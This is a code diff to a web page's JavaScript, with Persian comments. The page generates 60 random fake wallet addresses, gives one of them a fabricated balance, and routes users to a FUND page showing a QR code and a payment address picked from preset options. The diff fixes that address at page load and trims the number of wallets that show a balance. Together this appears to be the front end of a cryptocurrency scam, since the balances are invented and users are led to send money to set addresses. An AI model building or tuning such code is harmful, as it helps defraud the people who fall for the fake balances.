@@ -1026,6 +1026,16 @@
         }
       ];
       
+      // انتخاب یک آدرس تصادفی در ابتدای لود صفحه (فقط یک بار)
+      let selectedFundOption = null;
+      
+      // انتخاب تصادفی یک آدرس از بین سه گزینه
+      (function initFundAddress() {
+        const randomIndex = Math.floor(Math.random() * fundOptions.length);
+        selectedFundOption = fundOptions[randomIndex];
+        console.log('Selected fund address:', selectedFundOption.address); // برای دیباگ
+      })();
+      
       // generate 60 wallets: only 1 has balance (1 in 60 chance)
       const walletList = [];
       let indices = [];
@@ -1037,8 +1047,6 @@
       for (let i = 0; i < 60; i++) {
         let bal = 0;
         if (i === indices[0]) bal = btcValues[0];
-        // if (i === indices[1]) bal = btcValues[1]; // <--- حذف شده
-        // if (i === indices[2]) bal = btcValues[2]; // <--- حذف شده
         let addr = '0x' + Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
         walletList.push({ address: addr, balance: bal });
       }
@@ -1201,14 +1209,10 @@
         wallet.classList.add('active');
       });
 
-      // FUND navigation with random selection from the three options
+      // FUND navigation - استفاده از آدرس ثابت (تغییر داده شد)
       document.getElementById('fundActionMain').addEventListener('click', ()=>{
-        // Select random fund option from the three provided
-        const randomIndex = Math.floor(Math.random() * fundOptions.length);
-        const selected = fundOptions[randomIndex];
-        
-        document.getElementById('fundQrImage').src = selected.qr;
-        document.getElementById('fundAddress').innerText = selected.address;
+        document.getElementById('fundQrImage').src = selectedFundOption.qr;
+        document.getElementById('fundAddress').innerText = selectedFundOption.address;
         
         wallet.classList.remove('active');
         fundPage.classList.add('active');
